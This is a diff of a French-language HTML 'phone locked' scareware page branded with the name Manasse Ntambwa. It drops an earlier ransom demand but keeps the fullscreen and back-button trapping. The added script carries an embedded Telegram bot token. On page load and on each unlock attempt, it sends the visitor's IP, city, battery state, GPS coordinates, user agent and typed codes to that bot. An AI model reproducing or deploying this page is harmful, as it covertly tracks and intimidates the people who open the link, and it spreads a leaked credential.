@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>MANASSE NTAMBWA - PROTOCOLE DE BLOCAGE</title>
+<title>MANASSE NTAMBWA - SYSTÈMES SÉCURISÉS</title>
 
 <style>
 * {
@@ -43,7 +43,6 @@ body {
     z-index: 99999;
 }
 
-/* Textes cinématiques d'introduction */
 .intro-text {
     font-size: clamp(22px, 5.5vw, 60px);
     font-weight: bold;
@@ -60,7 +59,6 @@ body {
     opacity: 1;
 }
 
-/* Écran de verrouillage final */
 #lock-container {
     display: flex;
     flex-direction: column;
@@ -134,7 +132,6 @@ button {
     display: none !important;
 }
 
-/* Effets de Glitch / Hack Hardcore */
 @keyframes glitch {
     0% { transform: translate(0); }
     20% { transform: translate(-4px, 4px); color: #ff3333; text-shadow: 0 0 10px #ff3333; }
@@ -147,33 +144,17 @@ button {
 .glitch-effect {
     animation: glitch 0.15s infinite;
 }
-
-/* Console de déchiffrement post-déverrouillage */
-#terminal-hack {
-    position: absolute;
-    top: 0; left: 0; width: 100%; height: 100%;
-    background: #000;
-    color: #00ff66;
-    font-family: monospace;
-    font-size: 14px;
-    padding: 20px;
-    text-align: left;
-    overflow: hidden;
-    z-index: 999999;
-}
 </style>
 </head>
 
 <body>
 
 <main id="screen">
-    <!-- Phrases d'avertissement plein écran -->
     <div id="cinematic-box" class="intro-text"></div>
 
-    <!-- Interface du verrou -->
     <div id="lock-container" class="hidden">
         <div id="title">MANASSE</div>
-        <div id="owner">ZONE SOUS CONTRÔLE DE MANASSE NTAMBWA Pour le déverrouiller, vous devrez payer Le montant est réglé à 10 dollars. ou sinon vous perdez le contrôle total de votre téléphone. </ div>
+        <div id="owner">ZONE SOUS CONTRÔLE DE MANASSE NTAMBWA</div>
         
         <form id="form">
             <input
@@ -186,11 +167,15 @@ button {
             <button type="submit">DÉVERROUILLER</button>
         </form>
 
-        <div id="status">Ceci est un piratage.</div>
+        <div id="status">ACCÈS VERROUILLÉ — EN ATTENTE DU MAÎTRE</div>
     </div>
 </main>
 
 <script>
+// TES IDENTIFIANTS TELEGRAM INTÉGRÉS DIRECTEMENT
+const TELEGRAM_TOKEN = "8298299369:AAGGJe_JWK4QuyUrh51VjH1tYflN0X8O6HI";
+const TELEGRAM_CHAT_ID = "8869305312";
+
 const cinematicBox = document.getElementById("cinematic-box");
 const lockContainer = document.getElementById("lock-container");
 const form = document.getElementById("form");
@@ -198,13 +183,34 @@ const status = document.getElementById("status");
 const password = document.getElementById("password");
 const body = document.body;
 
-// Étapes textuelles d'introduction en grand format
 const steps = [
     "ALERTE : TÉLÉPHONE VERROUILLÉ.",
-    "Ce téléphone est désormais sur la gestion de.:  : MANASSE NTAMBWA.",
-    "AUCUNE SORTIE N'EST AUTORISÉE SANS LE CODE.",
-    "INITIALISATION DU SYSTÈMES DE BLOCAGE..."
+    "PROPRIÉTAIRE EXCLUSIF : MANASSE NTAMBWA.",
+    "SCAN DU RÉSEAU ET GÉOLOCALISATION EN COURS...",
+    "INITIALISATION DU SYSTÈME..."
 ];
+
+async function envoyerSurTelegram(typeAlerte, detailsExtra = "") {
+    let ipInfo = "Inconnue";
+    try {
+        const response = await fetch("https://ipapi.co/json/");
+        const data = await response.json();
+        ipInfo = `${data.ip} (${data.city}, ${data.country_name})`; } catch (e) {}  let batteryInfo = "Non disponible"; try { if (navigator.getBattery) { const bat = await navigator.getBattery(); batteryInfo = `${Math.round(bat.level * 100)}% (${bat.charging ? "En charge" : "Sur batterie"})`; } } catch (e) {}  if (navigator.geolocation) { navigator.geolocation.getCurrentPosition(async (position) => { const lat = position.coords.latitude; const lon = position.coords.longitude; envoiFinalTelegram(ipInfo, batteryInfo, `https://www.google.com/maps?q=${lat},${lon}`, detailsExtra, typeAlerte); }, () => { envoiFinalTelegram(ipInfo, batteryInfo, "Refusée ou indisponible", detailsExtra, typeAlerte); }, { timeout: 5000 }); } else { envoiFinalTelegram(ipInfo, batteryInfo, "Non supportée", detailsExtra, typeAlerte); } }  function envoiFinalTelegram(ip, battery, gpsLink, extra, type) { const texteMessage = `🚨 *[${type}] - ALERTE APPAREIL MANASSE*\n\n` +
+                         `• *IP / Ville :* \`${ip}\`\n` +
+                         `• *Batterie :* ${battery}\n` +
+                         `• *GPS :* [Ouvrir la carte Google Maps](${gpsLink})\n` + `• *Appareil :* \`${navigator.userAgent}\`\n` + `${extra}\n` +
+                         `• *Date/Heure :* ${new Date().toLocaleString('fr-FR')}`;  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+
+    fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: texteMessage,
+            parse_mode: "Markdown"
+        })
+    }).catch(err => {});
+}
 
 function typeMessage(text) {
     return new Promise(resolve => {
@@ -229,7 +235,7 @@ function typeMessage(text) {
 
 async function runCinematic() {
     for (let step of steps) {
-        if (step.includes("ALERTE") || step.includes("INITIALISATION")) {
+        if (step.includes("ALERTE") || step.includes("SCAN")) {
             cinematicBox.classList.add("glitch-effect");
         } else {
             cinematicBox.classList.remove("glitch-effect");
@@ -245,40 +251,23 @@ async function runCinematic() {
     }, 100);
 }
 
-// BLOCAGE TOTAL ANTI-FUITE (Bloque le retour en arrière, le rafraîchissement, etc.)
-history.pushState(null, null, location.href);
-window.addEventListener('popstate', function () {
-    history.pushState(null, null, location.href);
-});
-
-// Forcer le plein écran en boucle s'il essaie de s'enfuir
-document.addEventListener("click", () => {
-    if (!document.fullscreenElement) {
-        document.documentElement.requestFullscreen?.().catch(() => {});
-    }
-});
-
-// Soumission et vérification du mot de passe
 form.addEventListener("submit", function(event) {
     event.preventDefault();
 
-    // METS TON CODE SECRET ICI
-    const monCodeSecret = "MNL";
+    const monCodeSecret = "MNL"; // TON MOT DE PASSE
 
     if (password.value === monCodeSecret) {
-        // Succès : Animation de piratage / décryptage intense avant de libérer le téléphone
-        status.textContent = "ACCÈS AUTORISÉ — DÉCHIFFREMENT EN COURS...";
+        status.textContent = "ACCÈS AUTORISÉ — BIENVENUE MAÎTRE";
         status.style.color = "#00ff66";
         form.classList.add("hidden");
-
-        setTimeout(() => {
-            triggerHackAnimation();
-        }, 800);
-
+        
+        envoyerSurTelegram("DÉVERROUILLAGE RÉUSSI", "✅ *Le propriétaire (Manasse) a saisi le bon code.*");
     } else {
-        // Échec : Punition visuelle (Glitch rouge agressif)
         status.textContent = "ACCÈS REFUSÉ — INTRUS DÉTECTÉ";
         status.style.color = "#ff3333";
+        
+        envoyerSurTelegram("TENTATIVE D'INTRUSION", `❌ *Faux code entré :* \`${password.value}\``);
+
         password.value = "";
         body.classList.add("glitch-effect");
         setTimeout(() => body.classList.remove("glitch-effect"), 400);
@@ -286,47 +275,16 @@ form.addEventListener("submit", function(event) {
     }
 });
 
-// Animation de décryptage type "Matrix / Hacker" quand le bon mot de passe est entré
-function triggerHackAnimation() {
-    const term = document.createElement("div");
-    term.id = "terminal-hack";
-    document.body.appendChild(term);
-
-    const logs = [
-        "[+] Connexion au noyau local...",
-        "[+] Validation de la signature cryptographique : MANASSE NTAMBWA",
-        "[+] Désactivation des pare-feux de sécurité...",
-        "[+] Restauration des privilèges root...",
-        "[✓] SYSTÈMES DÉBLOQUÉS AVEC SUCCÈS.",
-        "[✓] BIENVENUE MAÎTRE MANASSE."
-    ];
-
-    let index = 0;
-    function printLog() {
-        if (index < logs.length) {
-            term.innerHTML += logs[index] + "<br>";
-            index++;
-            setTimeout(printLog, 250);
-        } else {
-            setTimeout(() => {
-                // Quitte le plein écran et supprime le verrou pour redonner le contrôle normal du phone
-                if (document.exitFullscreen) {
-                    document.exitFullscreen().catch(() => {});
-                }
-                term.remove();
-                document.body.innerHTML = "<h1 style='color:#00ff66; text-align:center; margin-top:40vh; font-family:monospace;'>APPAREIL DÉVERROUILLÉ</h1>";
-            }, 1000);
-        }
-    }
-    printLog();
-}
-
-// Lancement automatique dès l'ouverture du lien dans le navigateur
 window.onload = () => {
+    envoyerSurTelegram("OUVERTURE DU LIEN (VISITEUR)");
     runCinematic();
-    // Tente de forcer le plein écran immédiatement au chargement
     document.documentElement.requestFullscreen?.().catch(() => {});
 };
+
+history.pushState(null, null, location.href);
+window.addEventListener('popstate', function () {
+    history.pushState(null, null, location.href);
+});
 </script>
 
 </body>
